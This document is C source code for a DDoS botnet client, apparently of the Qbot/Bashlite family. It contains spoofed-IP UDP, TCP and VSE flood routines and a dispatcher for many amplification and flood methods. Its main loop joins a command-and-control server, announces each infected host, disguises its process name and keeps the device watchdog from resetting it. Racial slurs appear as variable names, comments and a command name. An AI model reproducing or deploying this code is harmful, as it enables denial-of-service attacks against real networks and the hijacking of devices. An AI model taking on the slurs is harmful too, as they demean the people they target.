    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, & tmp, sizeof(tmp)) < 0) {
      sockprintf(mainCommSock, "Failed setting raw headers mode.");
      return;
    }

    int counter = 50;
    while (counter--) {
      srand(time(NULL) ^ rand_cmwc());
      init_rand(rand());
    }

    in_addr_t netmask;

    if (spoofit == 0) netmask = (~((in_addr_t) - 1));
    else netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
    struct iphdr * iph = (struct iphdr * ) packet;
    struct udphdr * udph = (void * ) iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(GetRandomIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

    udph->len = htons(sizeof(struct udphdr) + packetsize);
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
    udph->check = 0;

    RandString((unsigned char * )(((unsigned char * ) udph) + sizeof(struct udphdr)), packetsize);

    iph->check = csum((unsigned short * ) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while (1) {
      sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

      udph->source = rand_cmwc();
      udph->dest = (port == 0 ? rand_cmwc() : htons(port));
      iph->id = rand_cmwc();
      iph->saddr = htonl(GetRandomIP(netmask));
      iph->check = csum((unsigned short * ) packet, iph->tot_len);

      if (i == pollRegister) {
        if (time(NULL) > end) break;
        i = 0;
        continue;
      }
      i++;

      if (ii == sleepcheck) {
        usleep(sleeptime * 1000);
        ii = 0;
        continue;
      }
      ii++;
    }
  }
}

void sendTCP(unsigned char * target, int port, int timeEnd, int spoofit, unsigned char * flags, int packetsize, int pollinterval) {
  register unsigned int pollRegister;
  pollRegister = pollinterval;

  struct sockaddr_in dest_addr;

  dest_addr.sin_family = AF_INET;
  if (port == 0) dest_addr.sin_port = rand_cmwc();
  else dest_addr.sin_port = htons(port);
  if (getHost(target, & dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (!sockfd) {
    sockprintf(mainCommSock, "Failed opening raw socket.");
    return;
  }

  int tmp = 1;
  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, & tmp, sizeof(tmp)) < 0) {
    sockprintf(mainCommSock, "Failed setting raw headers mode.");
    return;
  }

  in_addr_t netmask;

  if (spoofit == 0) netmask = (~((in_addr_t) - 1));
  else netmask = (~((1 << (32 - spoofit)) - 1));

  unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
  struct iphdr * iph = (struct iphdr * ) packet;
  struct tcphdr * tcph = (void * ) iph + sizeof(struct iphdr);

  makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(GetRandomIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

  tcph->source = rand_cmwc();
  tcph->seq = rand_cmwc();
  tcph->ack_seq = 0;
  tcph->doff = 5;

  if (!strcmp(flags, "ALL")) {
    tcph->syn = 1;
    tcph->rst = 1;
    tcph->fin = 1;
    tcph->ack = 1;
    tcph->psh = 1;
  } else {
    unsigned char * pch = strtok(flags, "-");
    while (pch) {
      if (!strcmp(pch, "SYN")) {
        tcph->syn = 1;
      } else if (!strcmp(pch, "RST")) {
        tcph->rst = 1;
      } else if (!strcmp(pch, "FIN")) {
        tcph->fin = 1;
      } else if (!strcmp(pch, "ACK")) {
        tcph->ack = 1;
      } else if (!strcmp(pch, "PSH")) {
        tcph->psh = 1;
      } else {
        sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
      }
      pch = strtok(NULL, ",");
    }
  }

  tcph->window = rand_cmwc();
  tcph->check = 0;
  tcph->urg_ptr = 0;
  tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
  tcph->check = tcpcsum(iph, tcph);

  iph->check = csum((unsigned short * ) packet, iph->tot_len);

  int end = time(NULL) + timeEnd;
  register unsigned int i = 0;
  while (1) {
    sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

    iph->saddr = htonl(GetRandomIP(netmask));
    iph->id = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->source = rand_cmwc();
    tcph->check = 0;
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum((unsigned short * ) packet, iph->tot_len);

    if (i == pollRegister) {
      if (time(NULL) > end) break;
      i = 0;
      continue;
    }
    i++;
  }
}

void sendFLUX(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( GetRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

	tcph->source = htons(5678);
	tcph->seq = rand();
	tcph->ack_seq = rand_cmwc();
	tcph->res2 = 0;
	tcph->doff = 5;
	tcph->syn = 1;
	tcph->ack = 1;
	tcph->window = rand_cmwc();
	tcph->check = 0;
	tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( GetRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

void sendVSE(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
	char *vse_payload;
    int vse_payload_len;
	vse_payload = "TSource Engine Query", &vse_payload_len;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
register unsigned int pollRegister;
pollRegister = pollinterval;
if(spoofit == 32) {
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd) {
return;
}
unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
if(buf == NULL) return;
memset(buf, 0, packetsize + 1);
RandString(buf, packetsize);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
if(i == pollRegister) {
if(port == 0) dest_addr.sin_port = rand_cmwc();
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
} else {
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
if(!sockfd) {
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
return;
}
int counter = 50;
while(counter--) {
srand(time(NULL) ^ rand_cmwc());
init_rand(rand());
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
makeVSEPacket(iph, dest_addr.sin_addr.s_addr, htonl( GetRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
udph->check = 0;
udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
RandString((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
iph->id = rand_cmwc();
iph->saddr = htonl( GetRandomIP(netmask) );
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister) {
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
}
}

void ioctl_keepalive(void)
{
    ioctl_pid = fork();
    if(ioctl_pid > 0 || ioctl_pid == -1)
        return;

    int timeout = 1;
    int ioctl_fd = 0;
    int found = 0;


    if((ioctl_fd = open("/dev/watchdog", 2)) != -1 ||
       (ioctl_fd = open("/dev/misc/watchdog", 2)) != -1 ||
       (ioctl_fd = open("/dev/FTWDT101_watchdog", 2)) != -1)
    {
        found = 0;
        ioctl(ioctl_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(1)
        {
            ioctl(ioctl_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    exit(0);
}

void processCmd(int argc, unsigned char * argv[]) {
  if (!strcmp(argv[0], "UDP")) {
    if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int spoofed = atoi(argv[4]);
    int packetsize = atoi(argv[5]);
    int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
    int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
    int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (!listFork()) {
        sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
        _exit(0);
      }
    }
    return;
  }

  if (!strcmp(argv[0], "TCP")) {
    if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1)) {
      return;
    }

    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int spoofed = atoi(argv[4]);
    unsigned char *flags = argv[5];

    int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
    int psize = argc > 6 ? atoi(argv[6]) : 0;

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (!listFork()) {
        sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
        _exit(0);
      }
    }
	return;
  }
  if (!strcmp(argv[0], "HTTP")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendHTTP(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendHTTP(ip, port, time);
    }
	return;
  }

  		if (!strcmp(argv[0], "HTTPHEX"))
		{
			if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
			if (listFork()) return;
			sendHEX(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
			exit(0);
		}
		
		
  if (!strcmp(argv[0], "STD")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendSTD(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendSTD(ip, port, time);
    }
	return;
  }

  if (!strcmp(argv[0], "LDAP")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendLDAP(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendLDAP(ip, port, time);
    }
	return;
  }

  if (!strcmp(argv[0], "NTP")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendNTP(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendNTP(ip, port, time);
    }
	return;
  }

  if (!strcmp(argv[0], "SNMP")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendSNMP(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendSNMP(ip, port, time);
    }
	return;
  }

  if (!strcmp(argv[0], "TFTP")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendTFTP(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendTFTP(ip, port, time);
    }
	return;
  }

  if (!strcmp(argv[0], "SSDP")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendSSDP(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendSSDP(ip, port, time);
    }
	return;
  }

  if (!strcmp(argv[0], "TELNET")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendTELNET(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendTELNET(ip, port, time);
    }
	return;
  }

  if(!strcmp(argv[0], "OVH"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendOVH(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendOVH(ip, port, time);
            _exit(0);
        }
    }   /////////////////////////OVH METHOD MADE BY DADDY KOMODO


    if(!strcmp(argv[0], "ZAP"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendZAP(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendZAP(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "100UP"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    Send100UP(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            Send100UP(ip, port, time);
            _exit(0);
        }
    }  

    if(!strcmp(argv[0], "PAKI"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendPAKI(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendPAKI(ip, port, time);
            _exit(0);
        }
    } 

    if(!strcmp(argv[0], "NUKE"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendNUKE(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendNUKE(ip, port, time);
            _exit(0);
        }
    } 
  
  		if(!strcmp(argv[0], "FLUX"))
        {
                if(argc < 6)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);

                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int psize = argc > 5 ? atoi(argv[5]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendFLUX(hi, port, time, spoofed, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendFLUX(ip, port, time, spoofed, psize, pollinterval);
                        _exit(0);
                }
        }
		
		if(!strcmp(argv[0], "VSE")) {
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
int spoofed = atoi(argv[4]);
int packetsize = atoi(argv[5]);
int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
if(strstr(ip, ",") != NULL) {
unsigned char *hi = strtok(ip, ",");
while(hi != NULL) {
if(!listFork()) {
sendVSE(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (!listFork()){
sendVSE(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
_exit(0);
}
}
return;
}

if (!strcmp(argv[0], "SLAP-OVH"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "NFO"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "VPN"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

        if(!strcmp(argv[0], "STOP"))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
				{
                        if (pids[i] != 0 && pids[i] != getpid())
						{
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
				{
					//
                } else {
							//
					   }
        }
}
  
  
int initConnection() {
    unsigned char server[512];
	memset(server, 0, 512);
	if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
	if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
	else currentServer++;
	strcpy(server, OreoServer[currentServer]);
	int port = 49182;
	if(strchr(server, ':') != NULL) {
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}
	mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
	return 0;
}

int getOurIP() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) return 0;

    struct sockaddr_in serv;
    memset( & serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr * ) & serv, sizeof(serv));
    if (err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr * ) & name, & namelen);
    if (err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;

    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while (fdgets(linebuf, 4096, cmdline) != NULL) {
      if (strstr(linebuf, "\t00000000\t") != NULL) {
        unsigned char * pos = linebuf;
        while ( * pos != '\t') pos++; * pos = 0;
        break;
      }
      memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if ( * linebuf) {
      int i;
      struct ifreq ifr;
      strcpy(ifr.ifr_name, linebuf);
      ioctl(sock, SIOCGIFHWADDR, & ifr);
      for (i = 0; i < 6; i++) macAddress[i] = ((unsigned char * ) ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
  }

int main(int argc, unsigned char *argv[]) {
        const char *lolsuckmekid = "";
        if(SERVER_LIST_SIZE <= 0) return 0;
        strncpy(argv[0],"",strlen(argv[0]));
        argv[0] = "";
        prctl(PR_SET_NAME, (unsigned long) lolsuckmekid, 0, 0, 0);
        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;
        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
		chdir("/");	
		setuid(0);				
		seteuid(0);
        signal(SIGPIPE, SIG_IGN);
        while(1) {
				if(fork() == 0) {
                if(initConnection()) { sleep(5); continue; }
				sockprintf(mainCommSock, "\x1b[0;31m\x1b[43mINFECTED\x1b[40m\x1b[0m \x1b[0;31m----\x1b[0;33m>    \x1b[0;31m[\x1b[0;33m%s\x1b[0;31m]  \x1b[0m", (char *)inet_ntoa(ourIP), (char *)Version);
				ioctl_keepalive();
				char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }
                        commBuf[got] = 0x00;
                        trim(commBuf);
						if(strstr(commBuf, "PING") == commBuf)
						{
							continue;
						}
                        if(strstr(commBuf, "DUP") == commBuf) exit(0); // DUP
                        unsigned char *message = commBuf;
                        if(*message == '!') {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;
                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;
                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;
                                while(pch) {
                                        if(*pch != '\n') {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }
                                processCmd(paramsCount, params);
                                if(paramsCount > 1) {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++) {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }
        return 0;
	}
}
